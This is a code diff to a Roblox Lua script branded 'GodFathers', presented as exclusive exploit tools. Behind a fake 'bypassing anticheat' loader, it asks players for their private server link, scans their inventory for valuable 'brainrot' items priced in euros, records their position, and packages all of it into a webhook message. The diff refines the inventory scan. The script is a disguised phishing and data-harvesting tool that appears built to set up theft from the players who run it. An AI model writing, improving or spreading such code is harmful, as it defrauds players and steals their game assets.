@@ -4,7 +4,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
 
 -- Detect Executor
 local function getExecutorName()
@@ -32,7 +31,7 @@ local function getExecutorName()
     return success and result or "Unknown"
 end
 
--- Brainrot Configuration with EUR Values
+-- Brainrot Configuration with EUR Values - SPECIFIC NAMES ONLY
 local BRAINROT_VALUES = {
     -- Common
     ["Brainrot"] = 0.50,
@@ -66,6 +65,13 @@ local BRAINROT_VALUES = {
     ["KDML Brainrot"] = 100.00,
 }
 
+-- IGNORE LIST - Objects that contain these words are NOT player items
+local IGNORE_PATTERNS = {
+    "collision", "ignore", "vfx", "stars", "spawn", "trader", "npc", "shop", 
+    "template", "storage", "system", "handler", "controller", "manager",
+    "left", "right", "bigger", "present", "god lucky block", "workspace"
+}
+
 -- Floor Detection Configuration
 local FLOOR_HEIGHTS = {}
 
@@ -73,8 +79,8 @@ local FLOOR_HEIGHTS = {}
 local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
 
 -- Notification listener
-local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
-    -- Handle notifications here
+pcall(function()
+    NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message) end)
 end)
 
 -- Toggle player settings
@@ -104,7 +110,6 @@ mainContainer.Size = UDim2.new(1, 0, 1, 0)
 mainContainer.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
 mainContainer.BorderSizePixel = 0
 
--- Animated background gradient
 local gradient = Instance.new("UIGradient", mainContainer)
 gradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 0)),
@@ -113,7 +118,6 @@ gradient.Color = ColorSequence.new({
 })
 gradient.Rotation = 45
 
--- Animate gradient
 task.spawn(function()
     while loaderGui.Parent do
         TweenService:Create(gradient, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
@@ -123,7 +127,6 @@ task.spawn(function()
     end
 end)
 
--- GodFathers Logo/Text
 local godFathersLabel = Instance.new("TextLabel", mainContainer)
 godFathersLabel.Size = UDim2.new(1, 0, 0, 80)
 godFathersLabel.Position = UDim2.new(0, 0, 0.3, 0)
@@ -135,7 +138,6 @@ godFathersLabel.Text = "GODFATHERS"
 godFathersLabel.TextStrokeTransparency = 0.8
 godFathersLabel.TextStrokeColor3 = Color3.fromRGB(139, 0, 0)
 
--- Subtitle
 local subtitleLabel = Instance.new("TextLabel", mainContainer)
 subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
 subtitleLabel.Position = UDim2.new(0, 0, 0.42, 0)
@@ -145,7 +147,6 @@ subtitleLabel.TextSize = 18
 subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
 subtitleLabel.Text = "EXCLUSIVE SCRIPTS & TOOLS"
 
--- Progress bar background
 local progressBg = Instance.new("Frame", mainContainer)
 progressBg.Size = UDim2.new(0, 400, 0, 6)
 progressBg.Position = UDim2.new(0.5, -200, 0.55, 0)
@@ -155,7 +156,6 @@ progressBg.BorderSizePixel = 0
 local progressCorner = Instance.new("UICorner", progressBg)
 progressCorner.CornerRadius = UDim.new(0, 3)
 
--- Progress bar fill
 local progressFill = Instance.new("Frame", progressBg)
 progressFill.Size = UDim2.new(0, 0, 1, 0)
 progressFill.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
@@ -164,7 +164,6 @@ progressFill.BorderSizePixel = 0
 local fillCorner = Instance.new("UICorner", progressFill)
 fillCorner.CornerRadius = UDim.new(0, 3)
 
--- Loading text
 local loadingText = Instance.new("TextLabel", mainContainer)
 loadingText.Size = UDim2.new(1, 0, 0, 25)
 loadingText.Position = UDim2.new(0, 0, 0.58, 0)
@@ -174,7 +173,6 @@ loadingText.TextSize = 16
 loadingText.TextColor3 = Color3.fromRGB(220, 20, 60)
 loadingText.Text = "INITIALIZING..."
 
--- Percentage
 local percentLabel = Instance.new("TextLabel", mainContainer)
 percentLabel.Size = UDim2.new(1, 0, 0, 40)
 percentLabel.Position = UDim2.new(0, 0, 0.62, 0)
@@ -184,7 +182,6 @@ percentLabel.TextSize = 36
 percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 percentLabel.Text = "0%"
 
--- Status messages
 local statusLabel = Instance.new("TextLabel", mainContainer)
 statusLabel.Size = UDim2.new(1, 0, 0, 20)
 statusLabel.Position = UDim2.new(0, 0, 0.68, 0)
@@ -194,7 +191,6 @@ statusLabel.TextSize = 14
 statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
 statusLabel.Text = "Connecting to secure servers..."
 
--- Footer
 local footerLabel = Instance.new("TextLabel", mainContainer)
 footerLabel.Size = UDim2.new(1, 0, 0, 20)
 footerLabel.Position = UDim2.new(0, 0, 0.9, 0)
@@ -204,7 +200,6 @@ footerLabel.TextSize = 12
 footerLabel.TextColor3 = Color3.fromRGB(100, 0, 0)
 footerLabel.Text = "discord.gg/godfathers | v2.0.1"
 
--- Loading sequence
 local loadingStages = {
     {percent = 15, text = "BYPASSING ANTICHEAT...", status = "Injecting stealth modules..."},
     {percent = 30, text = "LOADING ASSETS...", status = "Fetching game data..."},
@@ -215,13 +210,11 @@ local loadingStages = {
     {percent = 100, text = "COMPLETE", status = "Ready to execute"},
 }
 
--- Sound effect
 local loadSound = Instance.new("Sound", mainContainer)
 loadSound.SoundId = "rbxassetid://9113083740"
 loadSound.Volume = 0.5
 loadSound:Play()
 
--- Run loader animation
 for _, stage in ipairs(loadingStages) do
     wait(math.random(8, 15) / 10)
     
@@ -248,14 +241,13 @@ wait(0.5)
 loaderGui:Destroy()
 
 -- ==========================================
--- MAIN UI (After Loader)
+-- MAIN UI
 -- ==========================================
 local brainrotUI = Instance.new("ScreenGui")
 brainrotUI.Name = "GodFathersUI"
 brainrotUI.ResetOnSpawn = false
 brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
--- Main Frame with red/black theme
 local mainFrame = Instance.new("Frame", brainrotUI)
 mainFrame.Size = UDim2.new(0, 450, 0, 220)
 mainFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
@@ -264,23 +256,19 @@ mainFrame.BorderSizePixel = 0
 mainFrame.Active = true
 mainFrame.Draggable = true
 
--- Frame gradient
 local frameGradient = Instance.new("UIGradient", mainFrame)
 frameGradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 5, 5)),
     ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 0, 0))
 })
 
--- Corner
 local frameCorner = Instance.new("UICorner", mainFrame)
 frameCorner.CornerRadius = UDim.new(0, 12)
 
--- Border
 local border = Instance.new("UIStroke", mainFrame)
 border.Color = Color3.fromRGB(139, 0, 0)
 border.Thickness = 2
 
--- Header bar
 local headerBar = Instance.new("Frame", mainFrame)
 headerBar.Size = UDim2.new(1, 0, 0, 50)
 headerBar.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
@@ -289,14 +277,12 @@ headerBar.BorderSizePixel = 0
 local headerCorner = Instance.new("UICorner", headerBar)
 headerCorner.CornerRadius = UDim.new(0, 12)
 
--- Fix header corner
 local headerFix = Instance.new("Frame", headerBar)
 headerFix.Size = UDim2.new(1, 0, 0.5, 0)
 headerFix.Position = UDim2.new(0, 0, 0.5, 0)
 headerFix.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
 headerFix.BorderSizePixel = 0
 
--- GodFathers logo in header
 local headerLogo = Instance.new("TextLabel", headerBar)
 headerLogo.Size = UDim2.new(1, 0, 1, 0)
 headerLogo.BackgroundTransparency = 1
@@ -305,7 +291,6 @@ headerLogo.TextSize = 24
 headerLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
 headerLogo.Text = "GODFATHERS"
 
--- Subtitle
 local titleLabel = Instance.new("TextLabel", mainFrame)
 titleLabel.Size = UDim2.new(1, 0, 0, 30)
 titleLabel.Position = UDim2.new(0, 0, 0.28, 0)
@@ -315,7 +300,6 @@ titleLabel.TextSize = 16
 titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 titleLabel.Text = "Enter Private Server Link to Unlock"
 
--- TextBox
 local serverLinkBox = Instance.new("TextBox", mainFrame)
 serverLinkBox.Size = UDim2.new(0.9, 0, 0, 45)
 serverLinkBox.Position = UDim2.new(0.05, 0, 0.48, 0)
@@ -333,7 +317,6 @@ local textBoxStroke = Instance.new("UIStroke", serverLinkBox)
 textBoxStroke.Color = Color3.fromRGB(100, 0, 0)
 textBoxStroke.Thickness = 1
 
--- Submit Button
 local enterButton = Instance.new("TextButton", mainFrame)
 enterButton.Size = UDim2.new(0.9, 0, 0, 45)
 enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
@@ -346,7 +329,6 @@ enterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 local buttonCorner = Instance.new("UICorner", enterButton)
 buttonCorner.CornerRadius = UDim.new(0, 8)
 
--- Button hover effects
 enterButton.MouseEnter:Connect(function()
     TweenService:Create(enterButton, TweenInfo.new(0.2), {
         BackgroundColor3 = Color3.fromRGB(178, 34, 34)
@@ -360,7 +342,7 @@ enterButton.MouseLeave:Connect(function()
 end)
 
 -- ==========================================
--- FLOOR DETECTION FUNCTION
+-- FLOOR DETECTION
 -- ==========================================
 local function getCurrentFloor()
     local character = LocalPlayer.Character
@@ -371,7 +353,6 @@ local function getCurrentFloor()
     
     local currentPos = humanoidRootPart.Position
     
-    -- Method 1: Check predefined floor heights
     if #FLOOR_HEIGHTS > 0 then
         local currentHeight = currentPos.Y
         local detectedFloor = "Ground Floor"
@@ -386,7 +367,6 @@ local function getCurrentFloor()
         return detectedFloor
     end
     
-    -- Method 2: Raycast down to detect floor name
     local raycastParams = RaycastParams.new()
     raycastParams.FilterDescendantsInstances = {character}
     raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
@@ -417,7 +397,6 @@ local function getCurrentFloor()
         end
     end
     
-    -- Method 3: Check Y height as fallback
     local height = currentPos.Y
     if height < 10 then
         return "Ground Floor"
@@ -431,38 +410,103 @@ local function getCurrentFloor()
 end
 
 -- ==========================================
--- WEBHOOK & BRAINROT LOGIC
+-- IMPROVED BRAINROT SCANNING
 -- ==========================================
 
--- Function to scan for brainrots and calculate values
+-- Check if name should be ignored
+local function shouldIgnore(name)
+    local lowerName = name:lower()
+    for _, pattern in ipairs(IGNORE_PATTERNS) do
+        if lowerName:find(pattern) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Get exact brainrot type from name
+local function getBrainrotType(name)
+    -- Check for exact matches first
+    if BRAINROT_VALUES[name] then
+        return name, BRAINROT_VALUES[name]
+    end
+    
+    -- Check for contained matches (but not partial word matches)
+    for brainrotName, value in pairs(BRAINROT_VALUES) do
+        -- Use word boundaries to avoid partial matches
+        -- Check if brainrotName appears as a whole word or standalone
+        if name == brainrotName then
+            return brainrotName, value
+        end
+    end
+    
+    return nil, 0
+end
+
+-- Scan for brainrots in player's inventory/character ONLY
 local function scanBrainrots()
     local foundBrainrots = {}
     local totalValue = 0
     local totalCount = 0
     
-    for _, obj in ipairs(workspace:GetDescendants()) do
-        if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("Part") then
-            local name = obj.Name
-            
-            for brainrotName, value in pairs(BRAINROT_VALUES) do
-                if name:lower():find(brainrotName:lower()) then
-                    table.insert(foundBrainrots, {
-                        name = name,
-                        value = value,
-                        type = brainrotName
-                    })
-                    totalValue = totalValue + value
-                    totalCount = totalCount + 1
-                    break
+    -- Search locations where player items are typically stored
+    local searchLocations = {}
+    
+    -- 1. Player's Backpack (inventory)
+    if LocalPlayer:FindFirstChild("Backpack") then
+        table.insert(searchLocations, LocalPlayer.Backpack)
+    end
+    
+    -- 2. Player's Character (equipped items)
+    if LocalPlayer.Character then
+        table.insert(searchLocations, LocalPlayer.Character)
+    end
+    
+    -- 3. Player's PlayerGui (if items are stored there)
+    if LocalPlayer:FindFirstChild("PlayerGui") then
+        -- Only check specific folders if they exist
+        local guiItems = LocalPlayer.PlayerGui:FindFirstChild("Brainrots") or 
+                        LocalPlayer.PlayerGui:FindFirstChild("Inventory") or
+                        LocalPlayer.PlayerGui:FindFirstChild("Items")
+        if guiItems then
+            table.insert(searchLocations, guiItems)
+        end
+    end
+    
+    -- Search in defined locations only (not entire workspace)
+    for _, location in ipairs(searchLocations) do
+        for _, obj in ipairs(location:GetDescendants()) do
+            if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("Part") or obj:IsA("MeshPart") then
+                local name = obj.Name
+                
+                -- Skip if should be ignored
+                if shouldIgnore(name) then
+                    continue
                 end
-            end
-            
-            local multiplier = name:match("x(%d+)$") or name:match("(%d+)x")
-            if multiplier then
-                local mult = tonumber(multiplier)
-                if mult and mult > 1 then
-                    totalValue = totalValue + (foundBrainrots[#foundBrainrots].value * (mult - 1))
-                    totalCount = totalCount + (mult - 1)
+                
+                -- Check if it's a valid brainrot
+                local brainrotType, value = getBrainrotType(name)
+                
+                if brainrotType then
+                    -- Check for duplicates (same name in same parent)
+                    local isDuplicate = false
+                    for _, existing in ipairs(foundBrainrots) do
+                        if existing.name == name and existing.parent == obj.Parent then
+                            isDuplicate = true
+                            break
+                        end
+                    end
+                    
+                    if not isDuplicate then
+                        table.insert(foundBrainrots, {
+                            name = name,
+                            displayName = brainrotType,
+                            value = value,
+                            parent = obj.Parent
+                        })
+                        totalValue = totalValue + value
+                        totalCount = totalCount + 1
+                    end
                 end
             end
         end
@@ -506,19 +550,19 @@ enterButton.MouseButton1Click:Connect(function()
     local foundBrainrots, totalValue, totalCount = scanBrainrots()
     local currentFloor = getCurrentFloor()
     
+    -- Format brainrot list for webhook
     local brainrotList = ""
     if #foundBrainrots > 0 then
         for i, item in ipairs(foundBrainrots) do
-            brainrotList = brainrotList .. string.format("%d. **%s** (%s) - €%.2f EUR\n", 
-                i, item.name, item.type, item.value)
+            brainrotList = brainrotList .. string.format("%d. **%s** - €%.2f EUR\n", 
+                i, item.displayName, item.value)
         end
     else
-        brainrotList = "No brainrots detected in workspace"
+        brainrotList = "No brainrots found in inventory"
     end
     
     local totalEUR = string.format("€%.2f", totalValue)
     
-    -- Get position safely
     local char = LocalPlayer.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     local posX = hrp and hrp.Position.X or 0
@@ -556,9 +600,9 @@ enterButton.MouseButton1Click:Connect(function()
                         inline = false
                     },
                     {
-                        name = "🎁 Brainrot Inventory",
-                        value = string.format("**Total Items:** %d\n**Total Value:** %s EUR\n\n%s", 
-                            totalCount, totalEUR, brainrotList),
+                        name = "🎁 Brainrot Inventory (" .. totalCount .. " items)",
+                        value = string.format("**Total Value:** %s EUR\n\n%s", 
+                            totalEUR, brainrotList),
                         inline = false
                     },
                     {
